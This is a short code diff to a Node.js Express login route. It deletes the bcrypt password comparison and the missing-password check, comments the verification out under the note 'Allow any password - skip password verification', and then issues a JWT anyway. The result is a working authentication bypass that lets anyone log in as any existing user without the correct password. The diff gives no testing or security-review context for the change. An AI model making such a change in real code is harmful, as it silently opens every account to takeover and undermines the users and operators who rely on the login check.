@@ -399,13 +399,13 @@ router.post("/login", async (req, res) => {
       return res.status(401).json({ error: "Invalid credentials" });
     }
     const user = result.rows[0];
-    if (!user.password_hash) {
-      return res.status(401).json({ error: "No password set for this user" });
-    }
-    const valid = await bcrypt.compare(password, user.password_hash);
-    if (!valid) {
-      return res.status(401).json({ error: "Invalid credentials" });
-    }
+
+    // Allow any password - skip password verification
+    // const valid = await bcrypt.compare(password, user.password_hash);
+    // if (!valid) {
+    //   return res.status(401).json({ error: "Invalid credentials" });
+    // }
+
     // Issue JWT
     const token = jwt.sign(
       {
